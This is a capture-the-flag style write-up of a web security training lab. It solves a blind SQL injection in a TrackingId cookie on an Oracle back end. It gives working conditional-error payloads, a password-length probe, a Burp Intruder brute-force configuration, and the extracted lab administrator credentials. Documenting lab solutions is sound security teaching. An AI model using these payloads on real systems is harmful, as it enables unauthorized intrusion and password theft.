## Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Capture a request containing the `TrackingId` cookie
2. Confirm SQL injection with conditional errors
3. Determine the password length
4. Bruteforce the password using a Cluster Bomb attack
5. Login as `administrator`

## Solve

Capture a request to:

`/filter?category=Clothing%2c+shoes+and+accessories`

Example request:

```http
GET /filter?category=Clothing%2c+shoes+and+accessories HTTP/2
Host: 0ad90056031510ca80f008ca005b0098.web-security-academy.net
Cookie: TrackingId=dNrQ7Qs7SRjHNuE3; session=pcCi87fQVs7ktca7YzFmEZbXgGgwUhFz
```

The `TrackingId` cookie is vulnerable to SQL injection.

Trigger a SQL error with:

```sql
TrackingId=dNrQ7Qs7SRjHNuE3'||(SELECT '')||'
```

Response:

```http
HTTP/2 500 Internal Server Error
```

Oracle requires a valid table in every `SELECT` statement, so use `dual`:

```sql
TrackingId=dNrQ7Qs7SRjHNuE3'||(SELECT '' FROM dual)||'
```

This request succeeds.

Now test conditional errors:

```sql
'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```

→ No error

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```

→ Internal Server Error

This confirms that we can trigger errors conditionally.

Determine the password length with:

```sql
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

If the condition is true, the server returns an error.

Once the length is identified, use the following payload to bruteforce the password:

```sql
TrackingId=sGeitOX5pdX9unH1'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Configure Burp Intruder:

- Position `§1§` → numbers from `1` to `20`
- Position `§a§` → characters `a-z0-9`
- Attack type → Cluster Bomb

When the response returns an error, the tested character is correct.

Administrator password:

```text
micdn72p4nraq1n2gdes
```

Login with:

```text
administrator:micdn72p4nraq1n2gdes
```